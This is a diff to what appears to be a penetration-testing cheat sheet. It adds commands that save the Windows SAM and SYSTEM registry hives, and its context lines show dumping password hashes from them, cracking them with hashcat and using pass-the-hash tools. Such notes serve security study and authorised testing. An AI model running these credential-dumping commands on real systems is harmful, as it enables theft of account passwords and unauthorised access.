@@ -88,6 +88,10 @@ pip3 install pycrypto
 python3 creddump7/pwdump.py SYSTEM SAM
 hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 
+reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+the last parameter is the location where you want to copy the file
+
 #################################### PASS THE HASH ##############################################################
 pth-winexe, evil-winrm, psexec, wmiexec, crackmapexec.
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
